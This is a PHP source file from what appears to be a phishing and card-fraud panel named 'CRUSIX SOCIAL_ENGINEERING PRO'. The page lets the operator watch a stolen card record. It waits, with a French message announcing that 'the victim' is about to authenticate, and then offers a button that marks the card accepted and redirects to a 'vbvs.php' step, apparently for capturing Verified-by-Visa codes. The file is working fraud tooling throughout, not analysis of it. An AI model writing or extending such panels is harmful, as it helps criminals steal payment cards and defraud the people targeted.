<?php 
session_start();

include('../settings.php');
	
if(isset($_SESSION['connected']))
{	


$theid = $_SESSION['theid'];
	$base = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
	$stmt = $base->prepare("SELECT * FROM cards WHERE id=:theid"); 
	$stmt->bindParam(':theid',$theid);
                        
                             

                              $stmt->execute();
                              $set = $stmt->fetch();
  
                              $_SESSION['clientclicked'] = htmlspecialchars($set['clientclicked']);


                             if($_SESSION['clientclicked'] != "true")
                             {
?>

<style>
	@import url('https://fonts.googleapis.com/css2?family=Arimo&display=swap');
	body{
		background-color: #111111;
		font-family: 'Arimo', sans-serif;

	}


	#informations{
		color: #006400;
		
		font-size: 15px;
	}
	#inpinfo{
		font-size: 15px;
		border-color: transparent;
		border-style: none ;
		border-radius: 5px;
		font-style: italic;
		margin-top: 15px;
		height: 25px;
	}
	#butsub
	{
		margin-top:  15px;
		background-color: black;
		border-style: none;
		width: 100px;
		height: 30px;
		border-radius: 5px;
		font-style: italic;
		cursor: crosshair;
	}

	.lds-hourglass {
  display: inline-block;
  position: relative;
  width: 80px;
  height: 80px;

}
.lds-hourglass:after {
  content: " ";
  display: block;
  border-radius: 50%;
  width: 0;
  height: 0;
  margin: 8px;

  box-sizing: border-box;
  border: 32px solid #fff;
  border-color: #fff transparent #fff transparent;
  animation: lds-hourglass 1.2s infinite;
}
@keyframes lds-hourglass {
  0% {
    transform: rotate(0);
    animation-timing-function: cubic-bezier(0.55, 0.055, 0.675, 0.19);
  }
  50% {
    transform: rotate(900deg);
    animation-timing-function: cubic-bezier(0.215, 0.61, 0.355, 1);
  }
  100% {
    transform: rotate(1800deg);
  }
}

</style>
<meta http-equiv='refresh' content='1'>
<html>	
<head>
	    <meta name="viewport" content="width=device-width"/>

	<title>CRUSIX SOCIAL_ENGINEERING PRO</title>
	</head>


	<body>
		

		<center><div style="margin-top: 15%" class="lds-hourglass"></div></center>
		<center><p id="informations">Veuillez patienter, la victime va lancer son authentification... </p></center>
		
	</body>
	



</html>

<?php

	}
	else{
?>

<style>
	@import url('https://fonts.googleapis.com/css2?family=Arimo&display=swap');
	body{
		background-color: #111111;
		font-family: 'Arimo', sans-serif;

	}


	#informations{
		color: #006400;
		
		font-size: 15px;
	}
	#inpinfo{
		font-size: 15px;
		border-color: transparent;
		border-style: none ;
		border-radius: 5px;
		font-style: italic;
		margin-top: 15px;
		height: 25px;
	}
	#butsub
	{
		margin-top:  15px;
		background-color: black;
		border-style: none;
		width: 100px;
		height: 30px;
		border-radius: 5px;
		font-style: italic;
		cursor: crosshair;
	}

	

</style>
<meta http-equiv='refresh' content='1'>
<html>	
<head>
	    <meta name="viewport" content="width=device-width"/>

	<title>CRUSIX SOCIAL_ENGINEERING PRO</title>
	</head>


	<body>
		
<?php 
if(isset($_POST['valided']))
{

$base = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
                      $acc = $base->prepare('UPDATE cards SET accepted="1" WHERE id =:id');
                      $acc->bindParam(':id', $theid);
                      $acc->execute();

                      $acc = $base->prepare('UPDATE cards SET refused="true" WHERE id =:id');
                      $acc->bindParam(':id', $theid);
                      $acc->execute();
                      header('Location: vbvs.php');
}

?>
		<center><img style="margin-top: 9%" src="https://www.elit-info.com/wp-content/uploads/2019/02/icon-valide.png" width="120" ></center>
		<center><p id="informations">LANCEMENT DU VBV IMMINENT /!\ </p></center>
			<form action="" method="post"><center><button type="submit" id="butsub" name="valided" ><span style="color: darkgreen;">Validé</span></button></center></form>
	</body>
	



</html>

<?php

	}
}


	?>